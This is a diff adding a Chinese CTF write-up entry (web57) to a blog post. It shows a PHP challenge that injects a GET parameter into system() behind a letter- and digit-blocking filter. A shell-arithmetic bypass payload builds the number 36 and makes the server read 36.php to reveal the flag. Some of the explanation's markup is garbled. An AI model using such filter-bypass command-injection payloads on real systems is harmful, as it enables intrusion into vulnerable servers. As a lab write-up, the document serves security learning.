@@ -1640,6 +1640,21 @@ strings</p>
 <p>运行完后成功获取到flag<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web56/J36~B%25PUX3GF%7DVQASGO%5BDYX.png" alt=""></p>
 <h3 id="web57"><a class="header-anchor" href="#web57">¶</a>web57</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, $c))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.$c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这题不仅过滤了字母数字，还把通配符都给过滤了。查了一下资料，发现在shell中可以利用<code>$</code>和<code>()</code>进行构造数字，而这道题提示flag在36.php中，system中已经写好cat和php，所以我们只需要构造出36即可</p>
+<blockquote>
+<p>$(())                  							代表做一次运算，因为里面为空，也表示值为0<br>
+$((~$(())))         							对0作取反运算，值为1<br>
+$(($((<sub>$(())))$((</sub>$(())))))         	  (-1)+(-1)为-2，所以值为-2<br>
+$((<sub>$(($((</sub>$(())))$((~$(())))))))      再对-2做一次取反得到1，所以值为1</p>
+<p>如果对取反不了解可以百度一下，这里给个容易记得式子，如果对a按位取反，则得到的结果为-(a+1)，也就是对0取反得到1</p>
+</blockquote>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web57/CHH1%24IQ%40EBHL5L%2877%5B%40%251OP.png" alt=""><br>
+所以我们只要构造出-37，再进行取反，即可得到我们想要的数字36，payload如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web57/%5BYB%29%7D%5BYR3LS3%60MH~%60XVE0P4.png" alt=""><br>
+因为是cat命令，所以右键查看一下源码即可得到flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web57/%7DYV1%40J%28Y9HCI3OUEMBT0%5B17.png" alt=""></p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
